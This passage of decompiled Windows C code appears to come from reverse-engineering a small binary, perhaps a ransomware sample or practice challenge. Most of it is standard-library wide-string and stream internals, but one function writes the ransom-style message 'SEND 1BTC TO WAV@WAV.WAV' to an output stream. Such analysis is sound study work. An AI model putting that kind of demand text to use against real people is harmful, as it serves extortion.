      **(void ***)((int)this + 0x20) = _Dst;
      **(unsigned int **)((int)this + 0x30) = 1;
    }
    else
    {
      **(void ***)((int)this + 0x10) = _Dst;
      **(unsigned int **)((int)this + 0x20) = 0;
      **(int **)((int)this + 0x30) = (int)_Dst >> 1;
    }
  }
  else
  {
    *(void **)((int)this + 0x3c) =
        (void *)((int)_Dst + (*(int *)((int)this + 0x3c) - (int)_Src >> 1) * 2);
    pvVar1 = (void *)((int)_Dst + (**(int **)((int)this + 0x24) - (int)_Src >> 1) * 2);
    **(void ***)((int)this + 0x14) =
        (void *)((int)_Dst + ((int)**(void ***)((int)this + 0x14) - (int)_Src >> 1) * 2);
    **(void ***)((int)this + 0x24) = pvVar1;
    **(int **)((int)this + 0x34) = (int)((uVar4 * 2 - (int)pvVar1) + (int)_Dst) >> 1;
    if ((*(byte *)((int)this + 0x40) & 4) == 0)
    {
      iVar2 = **(int **)((int)this + 0x24);
      pvVar1 = (void *)((int)_Dst + (**(int **)((int)this + 0x20) - (int)_Src >> 1) * 2);
      **(void ***)((int)this + 0x10) = _Dst;
      **(void ***)((int)this + 0x20) = pvVar1;
      **(int **)((int)this + 0x30) = (iVar2 - (int)pvVar1) + 2 >> 1;
    }
    else
    {
      **(void ***)((int)this + 0x10) = _Dst;
      **(unsigned int **)((int)this + 0x20) = 0;
      **(int **)((int)this + 0x30) = (int)_Dst >> 1;
    }
  }
  if ((*(byte *)((int)this + 0x40) & 1) != 0)
  {
    operator_delete(_Src);
  }
  *(uint *)((int)this + 0x40) = *(uint *)((int)this + 0x40) | 1;
  pwVar3 = std::basic_streambuf<>::_Pninc((basic_streambuf<> *)this);
  *pwVar3 = param_1;
  return param_1;
}

short __thiscall FUN_00402510(void *this, short param_1)

{
  uint uVar1;

  uVar1 = **(uint **)((int)this + 0x20);
  if ((uVar1 != 0) && (**(uint **)((int)this + 0x10) < uVar1))
  {
    if ((param_1 == -1) ||
        ((param_1 == *(short *)(uVar1 - 2) || ((*(byte *)((int)this + 0x40) & 2) == 0))))
    {
      **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) + 1;
      **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + -2;
      if (param_1 != -1)
      {
        ***(short ***)((int)this + 0x20) = param_1;
        return param_1;
      }
      return 0;
    }
  }
  return -1;
}

unsigned int __fastcall FUN_00402580(int param_1)

{
  unsigned short *puVar1;
  unsigned short *puVar2;

  puVar1 = (unsigned short *)**(int **)(param_1 + 0x20);
  if (puVar1 == (unsigned short *)0x0)
  {
    return 0xffff;
  }
  if (puVar1 < puVar1 + **(int **)(param_1 + 0x30))
  {
    return CONCAT22((short)((uint)puVar1 >> 0x10), *puVar1);
  }
  if ((((*(byte *)(param_1 + 0x40) & 4) == 0) &&
       (puVar2 = (unsigned short *)**(unsigned int **)(param_1 + 0x24), puVar2 != (unsigned short *)0x0)) &&
      ((puVar1 < puVar2 || (puVar1 < *(unsigned short **)(param_1 + 0x3c)))))
  {
    if (*(unsigned short **)(param_1 + 0x3c) < puVar2)
    {
      *(unsigned short **)(param_1 + 0x3c) = puVar2;
    }
    **(int **)(param_1 + 0x30) = *(int *)(param_1 + 0x3c) - **(int **)(param_1 + 0x20) >> 1;
    return CONCAT22((short)((uint)(unsigned short *)**(unsigned int **)(param_1 + 0x20) >> 0x10),
                    *(unsigned short *)**(unsigned int **)(param_1 + 0x20));
  }
  return 0xffff;
}

void __thiscall FUN_004025f0(void *this, uint *param_1, uint param_2, uint param_3, int param_4, byte param_5)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  bool bVar6;

  uVar2 = **(uint **)((int)this + 0x24);
  if ((uVar2 != 0) && (*(uint *)((int)this + 0x3c) < uVar2))
  {
    *(uint *)((int)this + 0x3c) = uVar2;
  }
  if (((param_5 & 1) == 0) || (iVar5 = **(int **)((int)this + 0x20), iVar5 == 0))
  {
    if (((param_5 & 2) == 0) || (uVar2 = **(uint **)((int)this + 0x24), uVar2 == 0))
    {
      if ((param_2 | param_3) == 0)
        goto LAB_004027a1;
    }
    else
    {
      if (param_4 == 2)
      {
        iVar5 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
        uVar3 = iVar5 >> 1;
        bVar6 = CARRY4(param_2, uVar3);
        param_2 = param_2 + uVar3;
        param_3 = param_3 + (iVar5 >> 0x1f) + (uint)bVar6;
      }
      else if (param_4 == 1)
      {
        iVar5 = uVar2 - **(int **)((int)this + 0x10);
        uVar3 = iVar5 >> 1;
        bVar6 = CARRY4(param_2, uVar3);
        param_2 = param_2 + uVar3;
        param_3 = param_3 + (iVar5 >> 0x1f) + (uint)bVar6;
      }
      else if (param_4 != 0)
      {
        param_2 = *(uint *)_BADOFF_exref;
        param_3 = *(uint *)(_BADOFF_exref + 4);
      }
      if (-1 < (int)param_3)
      {
        iVar5 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
        iVar1 = iVar5 >> 0x1f;
        if (((int)param_3 <= iVar1) && (((int)param_3 < iVar1 || (param_2 <= (uint)(iVar5 >> 1)))))
        {
          iVar5 = ((int)(**(int **)((int)this + 0x10) - uVar2) >> 1) + param_2;
          **(int **)((int)this + 0x34) = **(int **)((int)this + 0x34) - iVar5;
          **(int **)((int)this + 0x24) = **(int **)((int)this + 0x24) + iVar5 * 2;
          goto LAB_004027a1;
        }
      }
    }
  }
  else
  {
    if (param_4 == 2)
    {
      iVar1 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
      uVar2 = iVar1 >> 1;
      bVar6 = CARRY4(param_2, uVar2);
      param_2 = param_2 + uVar2;
      param_3 = param_3 + (iVar1 >> 0x1f) + (uint)bVar6;
    }
    else if (param_4 == 1)
    {
      if ((param_5 & 2) == 0)
      {
        iVar1 = iVar5 - **(int **)((int)this + 0x10);
        uVar2 = iVar1 >> 1;
        bVar6 = CARRY4(param_2, uVar2);
        param_2 = param_2 + uVar2;
        param_3 = param_3 + (iVar1 >> 0x1f) + (uint)bVar6;
      }
      else
      {
      LAB_00402665:
        param_2 = *(uint *)_BADOFF_exref;
        param_3 = *(uint *)(_BADOFF_exref + 4);
      }
    }
    else if (param_4 != 0)
      goto LAB_00402665;
    if (-1 < (int)param_3)
    {
      iVar1 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
      iVar4 = iVar1 >> 0x1f;
      if (((int)param_3 <= iVar4) && (((int)param_3 < iVar4 || (param_2 <= (uint)(iVar1 >> 1)))))
      {
        iVar5 = (**(int **)((int)this + 0x10) - iVar5 >> 1) + param_2;
        **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) - iVar5;
        **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + iVar5 * 2;
        if ((param_5 & 2) != 0)
        {
          iVar5 = **(int **)((int)this + 0x24);
          if (iVar5 != 0)
          {
            iVar1 = **(int **)((int)this + 0x34);
            iVar4 = **(int **)((int)this + 0x20);
            **(int **)((int)this + 0x24) = iVar4;
            **(int **)((int)this + 0x34) = (iVar5 + iVar1 * 2) - iVar4 >> 1;
          }
        }
        goto LAB_004027a1;
      }
    }
  }
  param_2 = *(uint *)_BADOFF_exref;
  param_3 = *(uint *)(_BADOFF_exref + 4);
LAB_004027a1:
  *param_1 = param_2;
  param_1[1] = param_3;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}

void __thiscall FUN_004027c0(void *this, uint *param_1, uint param_2, int param_3, uint param_4)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  byte in_stack_00000020;

  uVar8 = param_4 + param_2;
  uVar1 = **(uint **)((int)this + 0x24);
  uVar6 = ((int)param_4 >> 0x1f) + param_3 + (uint)CARRY4(param_4, param_2);
  if ((uVar1 != 0) && (*(uint *)((int)this + 0x3c) < uVar1))
  {
    *(uint *)((int)this + 0x3c) = uVar1;
  }
  uVar1 = *(uint *)_BADOFF_exref;
  uVar2 = *(uint *)(_BADOFF_exref + 4);
  if ((uVar8 != uVar1) || (uVar7 = uVar6, uVar9 = uVar8, uVar6 != uVar2))
  {
    uVar7 = uVar2;
    uVar9 = uVar1;
    if (((in_stack_00000020 & 1) == 0) || (**(int **)((int)this + 0x20) == 0))
    {
      if ((((in_stack_00000020 & 2) != 0) && (**(int **)((int)this + 0x24) != 0)) &&
          (-1 < (int)uVar6))
      {
        iVar4 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
        iVar5 = iVar4 >> 0x1f;
        if (((int)uVar6 <= iVar5) && (((int)uVar6 < iVar5 || (uVar8 <= (uint)(iVar4 >> 1)))))
        {
          iVar4 = (**(int **)((int)this + 0x10) - **(int **)((int)this + 0x24) >> 1) + uVar8;
          **(int **)((int)this + 0x34) = **(int **)((int)this + 0x34) - iVar4;
          **(int **)((int)this + 0x24) = **(int **)((int)this + 0x24) + iVar4 * 2;
          uVar7 = uVar6;
          uVar9 = uVar8;
        }
      }
    }
    else if (-1 < (int)uVar6)
    {
      iVar4 = *(int *)((int)this + 0x3c) - **(int **)((int)this + 0x10);
      iVar5 = iVar4 >> 0x1f;
      if (((int)uVar6 <= iVar5) && (((int)uVar6 < iVar5 || (uVar8 <= (uint)(iVar4 >> 1)))))
      {
        iVar4 = (**(int **)((int)this + 0x10) - **(int **)((int)this + 0x20) >> 1) + uVar8;
        **(int **)((int)this + 0x30) = **(int **)((int)this + 0x30) - iVar4;
        **(int **)((int)this + 0x20) = **(int **)((int)this + 0x20) + iVar4 * 2;
        uVar7 = uVar6;
        uVar9 = uVar8;
        if ((in_stack_00000020 & 2) != 0)
        {
          iVar4 = **(int **)((int)this + 0x24);
          if (iVar4 != 0)
          {
            iVar5 = **(int **)((int)this + 0x34);
            iVar3 = **(int **)((int)this + 0x20);
            **(int **)((int)this + 0x24) = iVar3;
            **(int **)((int)this + 0x34) = (iVar4 + iVar5 * 2) - iVar3 >> 1;
          }
        }
      }
    }
  }
  *param_1 = uVar9;
  param_1[1] = uVar7;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  return;
}

int *__thiscall FUN_00402900(void *this, byte param_1)

{
  int *piVar1;
  void *local_10;
  unsigned char *puStack_c;
  unsigned int local_8;

  puStack_c = &LAB_00403ddc;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  piVar1 = (int *)((int)this + -0x60);
  *(unsigned char ***)(*(int *)(*piVar1 + 4) + -0x60 + (int)this) = std::basic_stringstream<>::vftable;
  local_8 = 0;
  FUN_00402280((unsigned int *)((int)this + -0x48));
  local_8 = 0xffffffff;
  std::basic_iostream<>::~basic_iostream<>((basic_iostream<> *)(unsigned int *)((int)this + -0x48));
  std::basic_ios<>::~basic_ios<>((basic_ios<> *)this);
  if ((param_1 & 1) != 0)
  {
    operator_delete(piVar1);
  }
  ExceptionList = local_10;
  return piVar1;
}

unsigned int *__thiscall FUN_00402990(void *this, byte param_1)

{
  FUN_00402280((unsigned int *)this);
  if ((param_1 & 1) != 0)
  {
    operator_delete(this);
  }
  return (unsigned int *)this;
}

void FUN_004029c0(void)

{
  void **unaff_ESI;
  void **unaff_EDI;

  if (unaff_ESI != unaff_EDI)
  {
    if ((void *)0x7 < unaff_ESI[5])
    {
      operator_delete(*unaff_ESI);
    }
    unaff_ESI[5] = (void *)0x7;
    unaff_ESI[4] = (void *)0x0;
    *(unsigned short *)unaff_ESI = 0;
    if (unaff_EDI[5] < (void *)0x8)
    {
      memmove(unaff_ESI, unaff_EDI, (int)unaff_EDI[4] * 2 + 2);
    }
    else
    {
      *unaff_ESI = *unaff_EDI;
      *unaff_EDI = (void *)0x0;
    }
    unaff_ESI[4] = unaff_EDI[4];
    unaff_ESI[5] = unaff_EDI[5];
    unaff_EDI[4] = (void *)0x0;
    unaff_EDI[5] = (void *)0x0;
  }
  return;
}

void FUN_00402a30(int **param_1, int *param_2)

{
  size_t _Size;
  bool bVar1;
  int *in_EAX;
  int **ppiVar2;
  int **extraout_ECX;
  int *piVar3;
  int **unaff_EDI;

  piVar3 = param_1[4];
  ppiVar2 = param_1;
  if (piVar3 < param_2)
  {
    std::_Xout_of_range("invalid string position");
    ppiVar2 = extraout_ECX;
  }
  piVar3 = (int *)((int)piVar3 - (int)param_2);
  if (in_EAX < piVar3)
  {
    piVar3 = in_EAX;
  }
  if (unaff_EDI != ppiVar2)
  {
    bVar1 = FUN_00402e80();
    if (bVar1)
    {
      if ((int *)0x7 < param_1[5])
      {
        param_1 = (int **)*param_1;
      }
      ppiVar2 = unaff_EDI;
      if ((int *)0x7 < unaff_EDI[5])
      {
        ppiVar2 = (int **)*unaff_EDI;
      }
      _Size = (int)piVar3 * 2;
      memcpy(ppiVar2, (void *)((int)param_1 + (int)param_2 * 2), _Size);
      unaff_EDI[4] = piVar3;
      if ((int *)0x7 < unaff_EDI[5])
      {
        *(unsigned short *)(_Size + (int)*unaff_EDI) = 0;
        return;
      }
      *(unsigned short *)(_Size + (int)unaff_EDI) = 0;
    }
    return;
  }
  FUN_00402e00((int *)((int)piVar3 + (int)param_2));
  FUN_00402e00((int *)0x0);
  return;
}

void *__fastcall FUN_00402ae0(uint param_1)

{
  void *pvVar1;
  unsigned char **local_14[3];
  char *local_8;

  if (param_1 == 0)
  {
    return (void *)0x0;
  }
  if ((param_1 < 0x80000000) && (pvVar1 = operator_new(param_1 * 2), pvVar1 != (void *)0x0))
  {
    return pvVar1;
  }
  local_8 = (char *)0x0;
  std::exception::exception((exception *)local_14, &local_8);
  local_14[0] = std::bad_alloc::vftable;
  // WARNING: Subroutine does not return
  _CxxThrowException(local_14, (ThrowInfo *)&DAT_00404970);
}

// WARNING: Removing unreachable block (ram,0x00402c4a)

void __thiscall FUN_00402b40(void *this, int param_1)

{
  uint uVar1;
  uint uVar2;
  unsigned int local_30;
  unsigned int local_20;
  uint local_1c;
  uint local_14;
  void *local_10;
  unsigned char *puStack_c;
  unsigned int local_8;

  local_8 = 0xffffffff;
  puStack_c = &LAB_00403e18;
  local_10 = ExceptionList;
  local_14 = DAT_00406018 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (((*(uint *)(param_1 + 0x40) & 2) == 0) && (**(uint **)(param_1 + 0x24) != 0))
  {
    uVar1 = **(uint **)(param_1 + 0x24);
    uVar2 = *(uint *)(param_1 + 0x3c);
    if (*(uint *)(param_1 + 0x3c) < uVar1)
    {
      uVar2 = uVar1;
    }
    local_1c = 7;
    local_20 = 0;
    local_30 = (void *)((uint)local_30._2_2_ << 0x10);
    FUN_00402cf0(&local_30, (int *)((int)(uVar2 - **(int **)(param_1 + 0x14)) >> 1));
    local_8 = 0;
  }
  else
  {
    if (((*(uint *)(param_1 + 0x40) & 4) != 0) || (**(int **)(param_1 + 0x20) == 0))
    {
      local_8 = 2;
      *(unsigned int *)((int)this + 0x10) = 0;
      *(unsigned int *)((int)this + 0x14) = 7;
      *(unsigned short *)this = 0;
      FUN_004029c0();
      goto LAB_00402c57;
    }
    local_1c = 7;
    local_20 = 0;
    local_30 = (void *)((uint)local_30._2_2_ << 0x10);
    FUN_00402cf0(&local_30,
                 (int *)((**(int **)(param_1 + 0x20) + **(int **)(param_1 + 0x30) * 2) -
                             **(int **)(param_1 + 0x10) >>
                         1));
    local_8 = 1;
  }
  *(unsigned int *)((int)this + 0x10) = 0;
  *(unsigned int *)((int)this + 0x14) = 7;
  *(unsigned short *)this = 0;
  FUN_004029c0();
  if (7 < local_1c)
  {
    operator_delete(local_30);
  }
LAB_00402c57:
  ExceptionList = local_10;
  ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc);
  return;
}

void FUN_00402c80(int **param_1)

{
  int *piVar1;
  bool bVar2;
  uint uVar3;
  void *local_10;
  unsigned char *puStack_c;
  unsigned int local_8;

  puStack_c = &LAB_00403d18;
  local_10 = ExceptionList;
  uVar3 = DAT_00406018 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 0;
  bVar2 = std::uncaught_exception();
  if (!bVar2)
  {
    std::basic_ostream<>::_Osfx((basic_ostream<> *)*param_1);
  }
  local_8 = 0xffffffff;
  piVar1 = *(int **)(*(int *)(**param_1 + 4) + 0x38 + (int)*param_1);
  if (piVar1 != (int *)0x0)
  {
    (**(code **)(*piVar1 + 8))(uVar3);
  }
  ExceptionList = local_10;
  return;
}

int **__thiscall FUN_00402cf0(void *this, int *param_1)

{
  uint uVar1;
  size_t _Size;
  void *in_EAX;
  int **ppiVar2;
  void *pvVar3;

  if (in_EAX != (void *)0x0)
  {
    uVar1 = *(uint *)((int)this + 0x14);
    pvVar3 = this;
    if (7 < uVar1)
    {
      // WARNING: Load size is inaccurate
      pvVar3 = *this;
    }
    if (pvVar3 <= in_EAX)
    {
      pvVar3 = this;
      if (7 < uVar1)
      {
        // WARNING: Load size is inaccurate
        pvVar3 = *this;
      }
      if (in_EAX < (void *)((int)pvVar3 + *(int *)((int)this + 0x10) * 2))
      {
        if (7 < uVar1)
        {
          // WARNING: Load size is inaccurate
          ppiVar2 = (int **)FUN_00402a30((int **)this, (int *)((int)in_EAX - *this >> 1));
          return ppiVar2;
        }
        ppiVar2 = (int **)FUN_00402a30((int **)this, (int *)((int)in_EAX - (int)this >> 1));
        return ppiVar2;
      }
    }
  }
  if ((int *)0x7ffffffe < param_1)
  {
    std::_Xlength_error("string too long");
  }
  if (*(int **)((int)this + 0x14) < param_1)
  {
    FUN_00402f00((int)this, (uint)param_1);
    if (param_1 == (int *)0x0)
    {
      return (int **)this;
    }
  }
  else if (param_1 == (int *)0x0)
  {
    *(unsigned int *)((int)this + 0x10) = 0;
    if ((int *)0x7 < *(int **)((int)this + 0x14))
    {
      // WARNING: Load size is inaccurate
      **this = 0;
      return (int **)this;
    }
    *(unsigned short *)this = 0;
    return (int **)this;
  }
  pvVar3 = this;
  if (7 < *(uint *)((int)this + 0x14))
  {
    // WARNING: Load size is inaccurate
    pvVar3 = *this;
  }
  _Size = (int)param_1 * 2;
  memcpy(pvVar3, in_EAX, _Size);
  *(int **)((int)this + 0x10) = param_1;
  if (*(uint *)((int)this + 0x14) < 8)
  {
    *(unsigned short *)(_Size + (int)this) = 0;
    return (int **)this;
  }
  // WARNING: Load size is inaccurate
  *(unsigned short *)(_Size + *this) = 0;
  return (int **)this;
}

void __fastcall FUN_00402e00(int *param_1)

{
  int **ppiVar1;
  uint in_EAX;
  uint uVar2;
  int *piVar3;
  int *extraout_ECX;
  int **ppiVar4;
  int **unaff_ESI;

  piVar3 = unaff_ESI[4];
  if (piVar3 < param_1)
  {
    std::_Xout_of_range("invalid string position");
    param_1 = extraout_ECX;
  }
  uVar2 = (int)piVar3 - (int)param_1;
  if (uVar2 < in_EAX)
  {
    in_EAX = uVar2;
  }
  if (in_EAX != 0)
  {
    ppiVar4 = unaff_ESI;
    ppiVar1 = unaff_ESI;
    if ((int *)0x7 < unaff_ESI[5])
    {
      ppiVar4 = (int **)*unaff_ESI;
      ppiVar1 = (int **)*unaff_ESI;
    }
    memmove((void *)((int)ppiVar4 + (int)param_1 * 2),
            (void *)((int)ppiVar1 + ((int)param_1 + in_EAX) * 2), (uVar2 - in_EAX) * 2);
    piVar3 = (int *)((int)unaff_ESI[4] - in_EAX);
    unaff_ESI[4] = piVar3;
    if ((int *)0x7 < unaff_ESI[5])
    {
      *(unsigned short *)((int)*unaff_ESI + (int)piVar3 * 2) = 0;
      return;
    }
    *(unsigned short *)((int)unaff_ESI + (int)piVar3 * 2) = 0;
  }
  return;
}

bool FUN_00402e80(void)

{
  unsigned int *in_EAX;
  uint unaff_ESI;

  if (0x7ffffffe < unaff_ESI)
  {
    std::_Xlength_error("string too long");
  }
  if ((uint)in_EAX[5] < unaff_ESI)
  {
    FUN_00402f00((int)in_EAX, unaff_ESI);
    return unaff_ESI != 0;
  }
  if (unaff_ESI == 0)
  {
    in_EAX[4] = 0;
    if (7 < (uint)in_EAX[5])
    {
      in_EAX = (unsigned int *)*in_EAX;
    }
    *(unsigned short *)in_EAX = 0;
  }
  return unaff_ESI != 0;
}

void FUN_00402ed0(void)

{
  int *piVar1;
  int **in_EAX;

  piVar1 = *(int **)(*(int *)(**in_EAX + 4) + 0x38 + (int)*in_EAX);
  if (piVar1 != (int *)0x0)
  {
    // WARNING: Could not recover jumptable at 0x00402ee6. Too many branches
    // WARNING: Treating indirect jump as call
    (**(code **)(*piVar1 + 8))();
    return;
  }
  return;
}

void FUN_00402f00(int param_1, uint param_2)

{
  uint uVar1;
  uint *puVar2;
  void *pvVar3;
  uint uVar4;
  uint uVar5;
  uint uStack_34;
  unsigned char **local_24[3];
  char *local_18;
  uint *local_14;
  void *local_10;
  unsigned char *puStack_c;
  unsigned int local_8;

  puStack_c = &LAB_00403db0;
  local_10 = ExceptionList;
  uStack_34 = DAT_00406018 ^ (uint)&stack0xfffffffc;
  local_14 = &uStack_34;
  ExceptionList = &local_10;
  uVar5 = param_2 | 7;
  if (uVar5 < 0x7fffffff)
  {
    uVar1 = *(uint *)(param_1 + 0x14);
    uVar4 = uVar1 >> 1;
    param_2 = uVar5;
    if ((uVar5 / 3 < uVar4) && (param_2 = uVar4 + uVar1, 0x7ffffffe - uVar4 < uVar1))
    {
      param_2 = 0x7ffffffe;
    }
  }
  uVar5 = param_2 + 1;
  local_8 = 0;
  puVar2 = &uStack_34;
  if ((uVar5 != 0) &&
      ((puVar2 = &uStack_34, 0x7fffffff < uVar5 ||
                                 (pvVar3 = operator_new(uVar5 * 2), puVar2 = local_14, pvVar3 == (void *)0x0))))
  {
    local_14 = puVar2;
    local_18 = (char *)0x0;
    std::exception::exception((exception *)local_24, &local_18);
    local_24[0] = std::bad_alloc::vftable;
    // WARNING: Subroutine does not return
    _CxxThrowException(local_24, (ThrowInfo *)&DAT_00404970);
  }
  local_14 = puVar2;
  FUN_00402fe1();
  return;
}

unsigned char *Catch_All_00402fba(void)

{
  int iVar1;
  void *pvVar2;
  int unaff_EBP;

  iVar1 = *(int *)(unaff_EBP + 0xc);
  *(BADSPACEBASE **)(unaff_EBP + -0x10) = register0x00000010;
  *(int *)(unaff_EBP + 0xc) = iVar1;
  *(unsigned char *)(unaff_EBP + -4) = 2;
  pvVar2 = FUN_00402ae0(iVar1 + 1);
  *(void **)(unaff_EBP + -0x14) = pvVar2;
  return &DAT_00402fd8;
}

void FUN_00402fe1(void)

{
  void **_Src;
  void *pvVar1;
  void **unaff_EBX;
  int unaff_EBP;
  void *unaff_ESI;
  void **unaff_EDI;

  pvVar1 = *(void **)(unaff_EBP + 0x10);
  if (pvVar1 != (void *)0x0)
  {
    _Src = unaff_EDI;
    if ((void *)0x7 < unaff_EDI[5])
    {
      _Src = (void **)*unaff_EDI;
    }
    memcpy(unaff_EBX, _Src, (int)pvVar1 * 2);
    pvVar1 = *(void **)(unaff_EBP + 0x10);
  }
  if ((void *)0x7 < unaff_EDI[5])
  {
    operator_delete(*unaff_EDI);
    pvVar1 = *(void **)(unaff_EBP + 0x10);
  }
  *unaff_EDI = unaff_EBX;
  unaff_EDI[5] = unaff_ESI;
  unaff_EDI[4] = pvVar1;
  if ((void *)0x7 < unaff_ESI)
  {
    unaff_EDI = unaff_EBX;
  }
  *(unsigned short *)((int)unaff_EDI + (int)pvVar1 * 2) = 0;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}

void Catch_All_00403042(void)

{
  void **ppvVar1;
  int unaff_EBP;

  ppvVar1 = *(void ***)(unaff_EBP + 8);
  if ((void *)0x7 < ppvVar1[5])
  {
    operator_delete(*ppvVar1);
  }
  ppvVar1[5] = (void *)0x7;
  ppvVar1[4] = (void *)0x0;
  *(unsigned short *)ppvVar1 = 0;
  // WARNING: Subroutine does not return
  _CxxThrowException((void *)0x0, (ThrowInfo *)0x0);
}

int *__cdecl FUN_00403080(int *param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int *piVar4;
  basic_ostream<> *this;
  bool bVar5;
  ushort uVar6;
  int iVar7;
  int iVar8;
  __int64 _Var9;
  int local_18;
  void *local_10;
  unsigned char *puStack_c;
  unsigned int local_8;

  local_8 = 0xffffffff;
  puStack_c = &LAB_00403d5a;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar1 = *(int *)(*param_1 + 4);
  iVar2 = *(int *)(iVar1 + 0x24 + (int)param_1);
  uVar3 = *(uint *)(iVar1 + 0x20 + (int)param_1);
  iVar8 = 0;
  local_18 = 0;
  if ((iVar2 < 0) ||
      ((iVar2 < 1 && (((uVar3 == 0 || (iVar2 < 0)) || ((iVar2 < 1 && (uVar3 < 0x19))))))))
  {
    iVar7 = 0;
  }
  else
  {
    iVar7 = uVar3 - 0x18;
    iVar8 = iVar2 - (uint)(uVar3 < 0x18);
  }
  piVar4 = *(int **)(iVar1 + 0x38 + (int)param_1);
  if (piVar4 != (int *)0x0)
  {
    (**(code **)(*piVar4 + 4))();
  }
  local_8 = 0;
  if ((*(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) == 0) &&
      (this = *(basic_ostream<> **)(*(int *)(*param_1 + 4) + 0x3c + (int)param_1),
       this != (basic_ostream<> *)0x0))
  {
    std::basic_ostream<>::flush(this);
  }
  if (*(int *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) != 0)
  {
    local_18 = 4;
    goto LAB_004031d8;
  }
  local_8 = 2;
  if ((*(uint *)(*(int *)(*param_1 + 4) + 0x14 + (int)param_1) & 0x1c0) == 0x40)
  {
  LAB_0040318a:
    _Var9 = std::basic_streambuf<>::sputn(*(basic_streambuf<> **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1),
                                          L"SEND 1BTC TO WAV@WAV.WAV", 0x18);
    if (_Var9 == 0x18)
    {
      while (true)
      {
        if ((iVar8 < 0) || ((iVar8 < 1 && (iVar7 == 0))))
          goto LAB_004031c2;
        uVar6 = std::basic_streambuf<>::sputc(*(basic_streambuf<> **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1),
                                              *(wchar_t *)(*(int *)(*param_1 + 4) + 0x40 + (int)param_1));
        if (uVar6 == 0xffff)
          break;
        bVar5 = iVar7 != 0;
        iVar7 = iVar7 + -1;
        iVar8 = iVar8 + -1 + (uint)bVar5;
      }
      local_18 = 4;
    }
    else
    {
      local_18 = 4;
    }
  }
  else
  {
    while (true)
    {
      if ((iVar8 < 0) || ((iVar8 < 1 && (iVar7 == 0))))
        goto LAB_00403184;
      uVar6 = std::basic_streambuf<>::sputc(*(basic_streambuf<> **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1),
                                            *(wchar_t *)(*(int *)(*param_1 + 4) + 0x40 + (int)param_1));
      if (uVar6 == 0xffff)
        break;
      bVar5 = iVar7 != 0;
      iVar7 = iVar7 + -1;
      iVar8 = iVar8 + -1 + (uint)bVar5;
    }
    local_18 = 4;
  LAB_00403184:
    if (local_18 == 0)
      goto LAB_0040318a;
  }
LAB_004031c2:
  iVar1 = *(int *)(*param_1 + 4);
  *(unsigned int *)(iVar1 + 0x20 + (int)param_1) = 0;
  *(unsigned int *)(iVar1 + 0x24 + (int)param_1) = 0;
LAB_004031d8:
  local_8 = 1;
  std::basic_ios<>::setstate((basic_ios<> *)(*(int *)(*param_1 + 4) + (int)param_1), local_18, false);
  local_8 = 4;
  bVar5 = std::uncaught_exception();
  if (!bVar5)
  {
    std::basic_ostream<>::_Osfx((basic_ostream<> *)param_1);
  }
  local_8 = 0xffffffff;
  piVar4 = *(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1);
  if (piVar4 != (int *)0x0)
  {
    (**(code **)(*piVar4 + 8))();
  }
  ExceptionList = local_10;
  return param_1;
}

unsigned char *Catch_All_00403286(void)

{
  int unaff_EBP;

  std::basic_ios<>::setstate((basic_ios<> *)(*(int *)(**(int **)(unaff_EBP + 8) + 4) + (int)*(int **)(unaff_EBP + 8)), 4, true);
  *(unsigned int *)(unaff_EBP + -4) = 1;
  return &DAT_004032a7;
}

unsigned int *__thiscall FUN_004032b0(void *this, exception *param_1)

{
  std::exception::exception((exception *)this, param_1);
  *(unsigned char ***)this = std::bad_alloc::vftable;
  return (unsigned int *)this;
}

void FUN_004032cd(uint param_1)

{
  operator_new(param_1);
  return;
}

// --------------------------------------------------------------------------
// Fonctions générées automatiquement : inutiles


void __thiscall std::basic_streambuf<>::imbue(basic_streambuf<> *this, locale *param_1)

{
  // WARNING: Could not recover jumptable at 0x004032d8. Too many branches
  // WARNING: Treating indirect jump as call
  imbue(this, param_1);
  return;
}

int __thiscall std::basic_streambuf<>::sync(basic_streambuf<> *this)

{
  int iVar1;

  // WARNING: Could not recover jumptable at 0x004032de. Too many branches
  // WARNING: Treating indirect jump as call
  iVar1 = sync(this);
  return iVar1;
}

basic_streambuf<> *__thiscall std::basic_streambuf<>::setbuf(basic_streambuf<> *this, wchar_t *param_1, __int64 param_2)

{
  basic_streambuf<> *pbVar1;

  // WARNING: Could not recover jumptable at 0x004032e4. Too many branches
  // WARNING: Treating indirect jump as call
  pbVar1 = setbuf(this, param_1, param_2);
  return pbVar1;
}

__int64 __thiscall std::basic_streambuf<>::xsputn(basic_streambuf<> *this, wchar_t *param_1, __int64 param_2)

{
  __int64 _Var1;

  // WARNING: Could not recover jumptable at 0x004032ea. Too many branches
  // WARNING: Treating indirect jump as call
  _Var1 = xsputn(this, param_1, param_2);
  return _Var1;
}

__int64 __thiscall std::basic_streambuf<>::xsgetn(basic_streambuf<> *this, wchar_t *param_1, __int64 param_2)

{
  __int64 _Var1;

  // WARNING: Could not recover jumptable at 0x004032f0. Too many branches
  // WARNING: Treating indirect jump as call
  _Var1 = xsgetn(this, param_1, param_2);
  return _Var1;
}

